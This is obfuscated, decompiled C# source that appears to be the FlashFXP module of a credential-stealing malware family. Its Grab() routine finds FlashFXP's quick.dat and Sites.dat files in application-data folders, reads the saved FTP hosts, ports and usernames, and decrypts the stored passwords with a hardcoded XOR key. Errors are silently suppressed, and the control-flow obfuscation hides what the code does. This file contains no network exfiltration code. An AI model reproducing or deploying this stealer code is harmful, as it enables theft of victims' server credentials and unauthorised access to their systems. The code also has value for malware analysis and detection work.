using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using _81d;
using p3N5Y;
using q9Ep;

namespace ZAZUx;

public class dyC : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string ZLlFY8LYiTx
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public dyC()
	{
		ZLlFY8LYiTx = "Flash FXP";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		List<string> list2 = default;
		while (true)
		{
			if (num == 4)
			{
				return list;
			}
			if (num != 5)
			{
				if (num == 2)
				{
					list2 = _2UpM0sT1();
					num = 3;
				}
				if (num == 3)
				{
					if (list2.Count > 0)
					{
						goto IL_003e;
					}
					num = 4;
				}
				if (num == 1)
				{
					list = new List<ii68>();
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 6)
				{
					break;
				}
				continue;
			}
			goto IL_003e;
			IL_003e:
			foreach (string item in list2)
			{
				try
				{
					string[] array = File.ReadAllLines(item);
					if (array == null)
					{
						return list;
					}
					array = array.Skip(1).ToArray();
					kKdeGISe kKdeGISe2 = new kKdeGISe();
					kKdeGISe2.fYtt7(array);
					foreach (string key in kKdeGISe2.Keys)
					{
						list.Add(new ii68
						{
							byIdLuuGZbL = kKdeGISe2[key]["IP"] + ":" + kKdeGISe2[key]["port"],
							S8v = kKdeGISe2[key]["user"],
							_9H5rP7hg2 = pUwtQ8EE3y(b4v.H4VWdV77v(kKdeGISe2[key]["pass"]), key),
							oVAe = ZLlFY8LYiTx
						});
					}
				}
				catch
				{
				}
			}
			return list;
		}
		List<ii68> result = default;
		return result;
	}

	public static List<string> _2UpM0sT1()
	{
		int num = 0;
		int num2 = default;
		string[] array = default;
		string[] array2 = default;
		string[] array3 = default;
		int num3 = default;
		object[] array4 = default;
		string[] array5 = default;
		string text = default;
		string[] array6 = default;
		string text2 = default;
		string[] array7 = default;
		int num4 = default;
		List<string> list = default;
		do
		{
			if (num == 32)
			{
				goto IL_001f;
			}
			goto IL_0036;
			IL_0036:
			if (num == 11)
			{
				num2 = 0;
				num = 12;
			}
			if (num == 20)
			{
				goto IL_031a;
			}
			if (num == 34)
			{
				goto IL_0089;
			}
			goto IL_00a0;
			IL_01f0:
			if (num == 5)
			{
				array = array2;
				num = 6;
			}
			if (num == 7)
			{
				array3[0] = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\FlashFXP\\";
				num = 8;
			}
			if (num == 19)
			{
				num3 = 0;
				num = 20;
			}
			if (num != 12)
			{
				if (num == 28)
				{
					if (!File.Exists(string.Concat(array4)))
					{
						goto IL_05c8;
					}
					num = 29;
				}
				if (num != 35)
				{
					goto IL_02e2;
				}
			}
			if (num2 >= array5.Length)
			{
				num = 36;
				goto IL_02e2;
			}
			goto IL_04cf;
			IL_04cf:
			text = array5[num2];
			num = 14;
			goto IL_04e5;
			IL_031a:
			if (num3 < array6.Length)
			{
				goto IL_02f3;
			}
			num = 32;
			goto IL_0332;
			IL_00a0:
			if (num == 24)
			{
				array4[1] = "\\";
				num = 25;
			}
			if (num == 23)
			{
				array4[0] = text;
				num = 24;
			}
			if (num == 33)
			{
				goto IL_0102;
			}
			goto IL_0119;
			IL_02f3:
			text2 = array6[num3];
			num = 22;
			goto IL_0309;
			IL_0309:
			if (num == 31)
			{
				goto IL_031a;
			}
			goto IL_0332;
			IL_05df:
			if (num == 0)
			{
				num = 1;
			}
			continue;
			IL_04e5:
			if (num == 2)
			{
				array2 = new string[2];
				num = 3;
			}
			if (num == 10)
			{
				array5 = array7;
				num = 11;
			}
			if (num == 25)
			{
				array4[2] = num4;
				num = 26;
			}
			if (num == 1)
			{
				list = new List<string>();
				num = 2;
			}
			if (num == 8)
			{
				array3[1] = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FlashFXP\\";
				num = 9;
			}
			if (num == 30)
			{
				goto IL_05c8;
			}
			goto IL_05df;
			IL_0119:
			if (num == 18)
			{
				array6 = array;
				num = 19;
			}
			if (num == 6)
			{
				array3 = new string[2];
				num = 7;
			}
			if (num == 3)
			{
				array2[0] = "quick.dat";
				num = 4;
			}
			if (num == 4)
			{
				array2[1] = "Sites.dat";
				num = 5;
			}
			if (num == 17)
			{
				goto IL_01c6;
			}
			goto IL_01f0;
			IL_05c8:
			num3++;
			num = 31;
			goto IL_05df;
			IL_0332:
			if (num == 27)
			{
				array4[4] = text2;
				num = 28;
			}
			if (num == 14)
			{
				if (!Directory.Exists(text))
				{
					goto IL_0089;
				}
				num = 15;
			}
			if (num == 22)
			{
				array4 = new object[5];
				num = 23;
			}
			if (num == 16)
			{
				goto IL_0102;
			}
			if (num == 15)
			{
				num4 = 3;
				num = 16;
			}
			if (num == 29)
			{
				list.Add(text + "\\" + num4 + "\\" + text2);
				num = 30;
			}
			if (num == 26)
			{
				array4[3] = "\\";
				num = 27;
			}
			if (num == 9)
			{
				array7 = array3;
				num = 10;
			}
			if (num == 13)
			{
				goto IL_04cf;
			}
			goto IL_04e5;
			IL_01c6:
			if (!Directory.Exists(text + "\\" + num4))
			{
				goto IL_001f;
			}
			num = 18;
			goto IL_01f0;
			IL_0089:
			num2++;
			num = 35;
			goto IL_00a0;
			IL_0102:
			if (num4 > 5)
			{
				num = 34;
				goto IL_0119;
			}
			goto IL_01c6;
			IL_001f:
			num4++;
			num = 33;
			goto IL_0036;
			IL_02e2:
			if (num == 21)
			{
				goto IL_02f3;
			}
			goto IL_0309;
		}
		while (num != 36);
		return list;
	}

	public static string pUwtQ8EE3y(byte[] HXRsQm, string _4kwe)
	{
		int num = 0;
		int num2 = default;
		int num3 = default;
		int num4 = default;
		int length = default;
		char[] array = default;
		int num5 = default;
		do
		{
			if (num == 9)
			{
				num2 = HXRsQm[num3];
				num = 10;
			}
			if (num == 15)
			{
				goto IL_0046;
			}
			goto IL_0062;
			IL_0227:
			num4 = HXRsQm[num3 + 1] ^ _4kwe[num3 % length];
			num = 9;
			goto IL_0256;
			IL_01ee:
			if (num == 16)
			{
				goto IL_01ff;
			}
			goto IL_0216;
			IL_0062:
			if (num == 11)
			{
				num4--;
				num = 12;
			}
			if (num == 4)
			{
				length = _4kwe.Length;
				num = 5;
			}
			if (num == 14)
			{
				goto IL_01ff;
			}
			if (num == 5)
			{
				array = new char[num5 - 1 + 1];
				num = 6;
			}
			if (num == 7)
			{
				goto IL_028b;
			}
			if (num == 1)
			{
				if (_4kwe.IndexOf('\u0003') != -1)
				{
					goto IL_0267;
				}
				num = 2;
			}
			if (num == 6)
			{
				num3 = 0;
				num = 7;
			}
			if (num == 10)
			{
				if (num2 < num4)
				{
					goto IL_01d2;
				}
				num = 11;
			}
			if (num == 2)
			{
				_4kwe = "yA36zA48dEhfrvghGRg57h5UlDv3";
				num = 3;
			}
			if (num == 12)
			{
				goto IL_01d2;
			}
			goto IL_01ee;
			IL_01ff:
			num3++;
			num = 17;
			goto IL_0216;
			IL_0216:
			if (num == 8)
			{
				goto IL_0227;
			}
			goto IL_0256;
			IL_027a:
			if (num == 17)
			{
				goto IL_028b;
			}
			goto IL_02a7;
			IL_0267:
			num5 = HXRsQm.Length;
			num = 4;
			goto IL_027a;
			IL_0256:
			if (num == 3)
			{
				goto IL_0267;
			}
			goto IL_027a;
			IL_028b:
			if (num3 <= num5 - 2)
			{
				goto IL_0227;
			}
			num = 18;
			goto IL_02a7;
			IL_02a7:
			if (num == 13)
			{
				array[num3] = (char)(256 + (num4 - num2));
				num = 14;
			}
			if (num == 0)
			{
				num = 1;
			}
			continue;
			IL_01d2:
			if (num4 - num2 >= 0)
			{
				goto IL_0046;
			}
			num = 13;
			goto IL_01ee;
			IL_0046:
			array[num3] = (char)(num4 - num2);
			num = 16;
			goto IL_0062;
		}
		while (num != 18);
		return new string(array);
	}
}
